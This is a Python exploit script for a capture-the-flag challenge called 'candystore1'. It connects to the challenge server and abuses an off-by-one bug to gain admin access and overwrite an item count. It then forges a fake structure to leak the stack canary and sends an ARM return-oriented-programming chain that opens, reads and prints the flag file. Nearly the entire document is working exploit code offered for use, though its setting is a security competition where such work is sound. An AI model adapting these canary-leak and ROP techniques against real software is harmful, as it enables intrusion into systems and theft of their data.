#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib
import ctypes

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "candystore1.chal.ctf.westerns.tokyo"
    PORT = 11111

DBG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

filename = "/home/candystore/flag"


rtil("> ")
uid = "B" * 12 + "\n"
s.send(uid)

# trigger off by one to toggle admin flag
rtil("> ")
profile = "".rjust(32, "Z")
s.send(profile)

money = "-1\n"
rtil("$")
s.send(money)
rtil("> ")

def order(feedback):
    s.send("O\n")
    rtil("| > ")
    s.send(feedback)
    return rtil("> ")

# note max len is 0x14
def put_item(item_id, note, ok="Y", order="n"):
    s.send("P\n")
    rtil("ID> ")
    s.send(str(item_id) + "\n")
    rtil("note> ")
    s.send(note)
    rtil("(Y/n)> ")
    s.send(ok + "\n")
    rtil("(Y/n)> ")
    s.send(order + "\n")
    return rtil("> ")

def remove_item(item_id):
    s.send("R\n")
    rtil("> ")
    s.send(str(item_id) + "\n")
    return rtil("> ")

def xit(ok="n"):
    s.send("X\n")
    rtil("> ")
    s.send(ok + "\n")

def admin_modify(storename, numitems, ok="Y"):
    s.send("A\n")
    rtil("> ")
    s.send("M\n")
    rtil("> ")
    s.send(storename)
    rtil("> ")
    s.send(str(numitems) + "\n")
    rtil("> ")
    s.send(ok + "\n")
    return rtil("> ")

def in_admin_modify(storename, numitems, ok="Y"):
    s.send("M\n")
    rtil("> ")
    s.send(storename)
    rtil("> ")
    s.send(str(numitems) + "\n")
    rtil("> ")
    s.send(ok + "\n")
    return rtil("> ")

def in_admin_add_item(name, cost, stock, ok="Y"):
    s.send("A\n")
    rtil("> ")
    s.send(name)
    rtil("> ")
    s.send(str(cost) + "\n")
    rtil("> ")
    s.send(str(stock) + "\n")
    rtil("> ")
    s.send(ok + "\n")
    return rtil("> ")

numitems = 18

# trigger off by one to overwrite numitems
buf = ""
buf = buf.ljust(128, "\xff")
admin_modify(buf, numitems)

# we craft a fake item_t
# take advantage of the fact that
# it accesses store[id - 1]
# at store[id - 1] we put the address of
# a fake item_t that points to the canary
# also put filename to open
buf = "A" * 64       # canary item_t ptr
buf += filename
buf += "\n"
in_admin_modify(buf, numitems)

buf = "A" * 4       # canary item_t ptr
buf += "A" * 4      # fake item_t ptr
buf += "B" * 32     # name
buf += "B" * 3      # item_id
buf += "\n"
in_admin_modify(buf, numitems)

buf = "A" * 4       # canary item_t ptr
buf += "A" * 4      # fake item_t ptr
buf += "B" * 32     # name
buf += "B" * 2      # item_id
buf += "\n"
in_admin_modify(buf, numitems)

buf = "A" * 4       # canary item_t ptr
buf += "A" * 4      # fake item_t ptr
buf += "B" * 32     # name
buf += p32(17)      # item_id
buf += "\n"
in_admin_modify(buf, numitems)

dwords = [0x24111]		# canary-leaker item_t
dwords += [0x24088 + 8]		# fake item_t

# rop gadgets
lc_open = 0x10708
lc_read = 0x10690
lc_write = 0x10768

# mov r7
# pop	{r3, r4, r5, r6, r7, r8, r9, pc}
popper = 0x13308

# magic mover
# 000132E8                 ADD     R4, R4, #1
# 000132EC                 LDR     R3, [R5,#4]!
# 000132F0                 MOV     R0, R7
# 000132F4                 MOV     R1, R8
# 000132F8                 MOV     R2, R9
# 000132FC                 BLX     R3
# 00013300                 CMP     R4, R6
# 00013304                 BNE     loc_132E8
magic = 0x132E8

# flag str
flag_str = 0x240c8
flag_loc = 0x2414D

# for rop we write a list of functions to call
# due to the mover gadget we have to use
dwords += [popper] # these are for rop

# write the dwords in store_name
for i in range(len(dwords)):
    cur = dwords[::-1][i]
    buf = "A" * 4 * (len(dwords) - (i + 1))        # canary item_t ptr
    buf += p32(cur)                                # fake item_t ptr
    buf += "\n"
    in_admin_modify(buf, numitems)

# return to menu
s.send("R\n")
rtil("> ")

# now put the item
buf = put_item(17, "A" * 8 + "\n")
buf = buf.split("\n")
buf = buf[-6].split("Name: ")[1]
cookie = buf.rjust(4, "\x00")
cookie = u32(cookie)

print "Leaked canary: %s"%(hex(cookie))


func_table = 0x24090 - 4
def caller(func, a0, a1, a2):
    global func_table
    buf = p32(func)	        # r3
    buf += p32(0x0)		# r4
    buf += p32(func_table)	# r5
    buf += p32(0x10)            # r6
    buf += p32(a0)              # r7 -> r0
    buf += p32(a1)              # r8 -> r1
    buf += p32(a2)              # r9 -> r2
    buf += p32(magic + 8)
    return buf

buf = "A" * 42
buf += p32(cookie)
buf += p32(0x4242)
buf += p32(0x0)             # index
buf += p32(func_table)      # function table address
buf += p32(0x10)  	    # num functions to call
buf += p32(0xbbbbbbbb)

# first call
buf += p32(magic)
buf += caller(lc_open, flag_str, 0x0, 0x0)
buf += caller(lc_read, 0x3, flag_loc, 0x40)
buf += caller(lc_write, 0x1, flag_loc, 0xff)
buf = buf.ljust(256, "Z")

flag = order(buf)
flag = flag.split("\n")[-2]
print flag
